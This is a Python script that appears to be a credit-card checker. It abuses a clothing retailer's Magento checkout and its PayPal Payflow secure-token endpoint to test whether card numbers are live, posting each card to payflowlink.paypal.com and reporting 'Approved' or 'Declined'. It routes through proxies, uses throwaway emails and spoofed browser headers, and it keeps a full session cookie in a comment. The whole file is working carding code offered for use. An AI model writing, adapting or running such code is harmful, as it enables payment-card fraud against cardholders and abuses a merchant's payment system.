import uuid
from httpx import AsyncClient
async def payflowccn1(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        email = uuid.uuid4().hex + '@gmail.com'

        req4 = await web.get('https://www.shan.ca/us_en/lili-pap-3-42563-88-000-2.html')
        try:
            form_key = req4.text.split('name="form_key" type="hidden" value="')[1].split('"')[0]
        except IndexError:
            try:
                form_key = req4.text.split('type="hidden" name="form_key" value="')[1].split('"')[0]
            except IndexError:
                return "Declined ❌", "Error: form_key not found"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'PHPSESSID=server1~1d2a0a768885946c25f4e07b93e75e5d; _omappvp=d3wsXWGI5lDLeT0xG7fut8jbo4WXjozB61eNGbNyV2cOG1YVB7cEIXLMoN8JjYyKVzkQ0wHGmuG5aQMe9rsvYYVm67edrfeF; _fbp=fb.1.1734567395988.29806802531817094; _pin_unauth=dWlkPVlqWmlZak01T1RndE5tTTVZeTAwWmpjNExUaG1NMlF0WWpNNE1ETTFNVEkyTkdWbA; _gcl_au=1.1.2070798663.1734567396; cf_clearance=fBVAflyH7WTx5cYDHBmAGO4sNcvGMJJN9wWsvB4.NgA-1734567396-1.2.1.1-4_YRM7kph0Fx4K0MZ4zeBdhlEOiq5oMYUzV5fOIiq2Ojy0J7xMjb6SN8hMeJ1lS5pPOlI2Rwq17JqddD5SQWwySbLODsKJn2yNE71AOY3i0lnA32nHqP6OaUMTtgaVv_TYoCMuAdbS1eJwV6.bBhlxXtbCo4_Km_5UKP.skEmKoSvXHUv7PVPq.B8oSOoO8B2bASpjdhH8rXfDEMRaLULqh.nF0c9X3V1CnM_E3qV8TS.pE0_mjRCYDm7xFlmejpfkrJX6qod1F9Umd45yjhi2LS7rA2wnRg78SNWaV6nu1V1cYviIp1Wk851ckwdurZP0fCiEAcqCAIvlh9xFqskyNluIlUfaWO.BCIe_NPAejjPtbMzQg8U3F3gY2uE8sS1qrH.52_bMUZaUd4Dt4KlA; twodev_store_cookie=us_en; _gid=GA1.2.449415024.1734567396; sa-user-id=s%253A0-be30ba89-0ea7-5a1c-4eee-756ac95f4581.oQ7577TuzSNONbplneP0T%252F3sJ0tcs0jslRkZLnVBSCs; sa-user-id-v2=s%253AvjC6iQ6nWhxO7nVqyV9Fgb34i2I.AVXGnl01XA8DoEY5uatCVczDaXgYrhL1QOVVBnjSUzQ; sa-user-id-v3=s%253AAQAKIAGUNbkvHfxGoIW1XD8pkz-iQ7M6o6j50USQmplkR4JOEAEYAyCKody4BjABOgSOHXLLQgSPEgnq.wmV8n2dLsm8Oa7t%252FRCCmesdk%252BExRpO2Os26dKdzLKTc; form_key=AwFOpmBitY55gVCF; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; _clck=15i4kic%7C2%7Cfru%7C0%7C1814; mage-messages=; amcookie_policy_restriction=allowed; product_data_storage={}; form_key=AwFOpmBitY55gVCF; amcookie_allowed=0; _ga=GA1.3.1805670417.1734567396; _gid=GA1.3.449415024.1734567396; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; _omappvs=1734567414050; _ga=GA1.2.1805670417.1734567396; _derived_epik=dj0yJnU9M2FscExxTHBzY3ZHLWgzMHVrZi1acFNvTUpIazBJOVQmbj1XaFhxYlUwQnYweXNWSTRQanpLamtnJm09MSZ0PUFBQUFBR2RqWmZZJnJtPTEmcnQ9QUFBQUFHZGpaZlkmc3A9Mg; _uetsid=82b6f9f0bd9e11ef8fd7f5458fb75368; _uetvid=82b6fed0bd9e11ef87406792fd8d2895; private_content_version=e4698696a6bc3df18ac483cc35cfeba7; _ga_XHDSY3RXZQ=GS1.1.1734567396.1.1.1734567528.31.0.2025400945; section_data_ids={%22messages%22:1734568503%2C%22payments%22:1734567410%2C%22cart%22:1734567529%2C%22directory-data%22:1734567411%2C%22gtm-checkout%22:1734567499}',
            'origin': 'https://www.shan.ca',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.shan.ca/us_en/checkout/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        one = cc[0:1]
        if one == "4":
            cc_type = "VI"
        elif one == "5":
            cc_type = "MC"
        elif one == "3":
            cc_type = "Ax"
        elif one == "6":
            cc_type = "DC"

        data = [
            ('form_key', form_key),
            ('captcha_form_id', 'payment_processing_request'),
            ('am-gdpr-checkboxes-from', 'checkout'),
            ('captcha_form_id', 'co-payment-form'),
            ('am-gdpr-checkboxes-from', 'checkout'),
            ('am-gdpr-checkboxes-from', 'checkout'),
            ('payment[method]', 'payflowpro'),
            ('captcha_form_id', 'co-payment-form'),
            ('am-gdpr-checkboxes-from', 'checkout'),
            ('controller', 'checkout_flow'),
            ('cc_type', cc_type),
        ]
        
        data = dict(data)
        req1 = await web.post('https://www.shan.ca/us_en/paypal/transparent/requestSecureToken/',headers=headers,data=data,)
        print(req1.text)
        try:
            securetokenid = req1.text.split('"securetokenid":"')[1].split('"')[0]
            securetoken = req1.text.split('"securetoken":"')[1].split('"')[0]
        except IndexError:
            return "Declined ❌", "Error: secure token not found"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.shan.ca',
            'Pragma': 'no-cache',
            'Referer': 'https://www.shan.ca/',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'result': '0',
            'securetoken': securetoken,
            'securetokenid': securetokenid,
            'respmsg': 'Approved',
            'result_code': '0',
            #'csc': '000',
            'expdate': mes+ano,
            'acct': cc,
        }

        req2 = await web.post('https://payflowlink.paypal.com/', headers=headers, data=data)
        if "Verified" in req2.text:
            status = "Approved ✅"
            mensaje = "Approved Auth!"
        else:
            try:
                mensaje = req2.text.split('type="hidden" name="RESPMSG" value="')[1].split('"')[0]
            except IndexError:
                mensaje = "Declined (RESPMSG not found)"
            
            if "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje